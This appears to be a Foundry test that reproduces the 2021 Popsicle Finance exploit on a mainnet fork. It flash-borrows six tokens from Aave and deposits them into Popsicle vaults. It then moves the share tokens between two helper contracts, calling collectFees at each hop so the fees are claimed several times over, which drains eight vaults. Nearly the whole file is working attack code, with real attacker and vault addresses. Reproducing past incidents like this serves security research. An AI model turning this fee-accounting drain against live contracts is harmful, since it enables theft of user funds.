// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IPopsicle {
    function balanceOf(address account) external view returns (uint256);

    function collectFees(uint256 amount0, uint256 amount1) external;

    function deposit(
        uint256 amount0Desired,
        uint256 amount1Desired
    ) external payable returns (uint256 shares, uint256 amount0, uint256 amount1);

    function symbol() external view returns (string memory);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function userInfo(address)
        external
        view
        returns (uint256 token0Rewards, uint256 token1Rewards, uint256 token0PerSharePaid, uint256 token1PerSharePaid);

    function withdraw(uint256 shares) external returns (uint256 amount0, uint256 amount1);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IERC20X is IERC20 {
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}
// Simple contract which transfers tokens to an address

contract TokenVault {
    using SafeERC20 for IERC20X;

    function transfer(address _asset, address _to) external {
        uint256 bal = IERC20X(_asset).balanceOf(address(this));
        if (bal > 0) IERC20X(_asset).safeTransfer(_to, bal);
    }

    function executeCall(address target, bytes calldata dataTocall) external returns (bool succ) {
        (succ,) = target.call(dataTocall);
    }
}

// @KeyInfo - Total Lost : 20M
// Attacker : https://etherscan.io/address/0xf9E3D08196F76f5078882d98941b71C0884BEa52
// Attack Contract : https://etherscan.io/address/0xdFb6faB7f4bc9512d5620e679E90D1C91C4EAdE6
// Vulnerable Contract : https://etherscan.io/address/0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48
// Attack Tx : https://etherscan.io/tx/0xcd7dae143a4c0223349c16237ce4cd7696b1638d116a72755231ede872ab70fc

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48#code

// @Analysis
// Post-mortem : https://blocksecteam.medium.com/the-analysis-of-the-popsicle-finance-security-incident-9d9d5a3045c1
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1422786223156776968
// Hacking God : https://twitter.com/BlockSecTeam/status/1422786223156776968

contract PopsicleExp is Test {
    using SafeERC20 for IERC20X;

    IAaveFlashloan aaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    TokenVault receiver1;
    TokenVault receiver2;

    //Asset addrs
    address _usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address _weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _wbtc = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address _usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address _dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address _uni = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;

    //Flashloan amts
    uint256 usdtFlash = 30_000_000 * 1e6;
    uint256 ethFlash = 13_000 ether;
    uint256 wbtcFlash = 1400 * 1e8;
    uint256 usdcFlash = 30_000_000 * 1e6;
    uint256 daiFlash = 3_000_000 ether;
    uint256 uniFlash = 200_000 ether;

    address[] assetsArr;
    address[] vaultsArr;

    uint256[] amountsArr;
    uint256[] modesArr;

    IERC20X usdt = IERC20X(_usdt);
    IERC20X weth = IERC20X(_weth);
    IERC20X wbtc = IERC20X(_wbtc);
    IERC20X usdc = IERC20X(_usdc);
    IERC20X dai = IERC20X(_dai);
    IERC20X uni = IERC20X(_uni);

    function setUp() public {
        vm.createSelectFork("mainnet", 12_955_000); //fork gnosis at block number 21120319

        receiver1 = new TokenVault();
        receiver2 = new TokenVault();
        modesArr = [0, 0, 0, 0, 0, 0];
        assetsArr = [_usdt, _weth, _wbtc, _usdc, _dai, _uni];
        amountsArr = [usdtFlash, ethFlash, wbtcFlash, usdcFlash, daiFlash, uniFlash];
        vaultsArr = [
            0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48,
            0xd63b340F6e9CCcF0c997c83C8d036fa53B113546,
            0x0A8143EF65b0CE4C2fAD195165ef13772ff6Cca0,
            0x98d149e227C75D38F623A9aa9F030fB222B3FAa3,
            0xB53Dc33Bb39efE6E9dB36d7eF290d6679fAcbEC7,
            0x6f3F35a268B3af45331471EABF3F9881b601F5aA,
            0xDD90112eAF865E4E0030000803ebBb4d84F14617,
            0xE22EACaC57A1ADFa38dCA1100EF17654E91EFd35
        ];
    }

    function approveToTargetAll(address _target) internal {
        for (uint256 i = 0; i < assetsArr.length; i++) {
            approveToTarget(assetsArr[i], _target);
        }
    }

    function approveToTarget(address asset, address _target) internal {
        IERC20X(asset).forceApprove(_target, type(uint256).max);
    }

    function _logBalances(string memory message) internal {
        console.log(message);
        console.log("--- Start of balances --- ");
        console.log("USDT Balance %d", _logTokenBal(_usdt));
        console.log("WETH Balance %d", _logTokenBal(_weth));
        console.log("WBTC Balance %d", _logTokenBal(_wbtc));
        console.log("USDC Balance %d", _logTokenBal(_usdc));
        console.log("DAI Balance %d", _logTokenBal(_dai));
        console.log("UNI Balance %d", _logTokenBal(_uni));
        console.log("--- End of balances --- ");
    }

    function _logTokenBal(address asset) internal view returns (uint256) {
        return IERC20X(asset).balanceOf(address(this));
    }

    function testExploit() public {
        _logBalances("Before attack");
        aaveV2.flashLoan(address(this), assetsArr, amountsArr, modesArr, address(this), new bytes(0), 0);
        _logBalances("After attack");
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        attackLogic();
        //Check we are in profit on each asset
        for (uint256 i = 0; i < assets.length; i++) {
            uint256 bal = _logTokenBal(assets[i]);
            emit log_named_decimal_uint("Profit ", (bal - (amounts[i] + premiums[i])), IERC20X(assets[i]).decimals());
            console.log(" for asset ", IERC20X(assets[i]).name());
        }
        approveToTargetAll(address(aaveV2));
        return true;
    }

    function attackLogic() internal {
        for (uint256 i = 0; i < vaultsArr.length; i++) {
            //Approve funds for vault
            IPopsicle vault = IPopsicle(vaultsArr[i]);
            IERC20X(vault.token0()).forceApprove(vaultsArr[i], type(uint256).max);
            IERC20X(vault.token1()).forceApprove(vaultsArr[i], type(uint256).max);
            vault.deposit(
                IERC20X(vault.token0()).balanceOf(address(this)), IERC20X(vault.token1()).balanceOf(address(this))
            );
            drainVault(vaultsArr[i]);
        }
        claimFundsFromReceivers();
    }

    function claimFundsFromReceivers() internal {
        for (uint256 i = 0; i < assetsArr.length; i++) {
            receiver1.transfer(assetsArr[i], address(this));
            receiver2.transfer(assetsArr[i], address(this));
        }
    }

    function drainVault(address _vault) internal {
        //Transfer the vault token around to 2 other receivers then back
        transferAround(_vault);
        //Then redeem our position and claim fees
        withdrawandClaimFees(_vault);
    }

    function withdrawandClaimFees(address _vault) internal {
        claimFees(_vault);
    }

    function claimFees(address _vault) internal {
        (uint256 token0fees, uint256 token1fees,,) = IPopsicle(_vault).userInfo(address(this));
        //Collect fees
        IPopsicle(_vault).withdraw(IPopsicle(_vault).balanceOf(address(this)));
        (uint256 token0feesr1, uint256 token1feesr1,,) = IPopsicle(_vault).userInfo(address(receiver1));

        receiver1.executeCall(
            _vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, token0feesr1, token1feesr1)
        );
        (uint256 token0feesr2, uint256 token1feesr2) = (
            IERC20X(address(IPopsicle(_vault).token0())).balanceOf(_vault),
            IERC20X(address(IPopsicle(_vault).token1())).balanceOf(_vault)
        );

        receiver2.executeCall(
            _vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, token0feesr2, token1feesr2)
        );
        console.log("Self - Token0 Fees:", token0fees, "Token1 Fees:", token1fees);
        console.log("Receiver1 - Token0 Fees:", token0feesr1, "Token1 Fees:", token1feesr1);
        console.log("Receiver2 - Token0 Fees:", token0feesr2, "Token1 Fees:", token1feesr2);
    }

    function transferAround(address _vault) internal {
        IERC20X asset = IERC20X(_vault);

        uint256 bal = asset.balanceOf(address(this));
        IPopsicle(_vault).collectFees(0, 0);

        asset.transfer(address(receiver1), bal);
        receiver1.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, 0, 0));
        receiver1.transfer(_vault, address(receiver2));

        receiver2.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, 0, 0));
        receiver2.transfer(_vault, address(this));

        IPopsicle(_vault).collectFees(0, 0);
    }
}
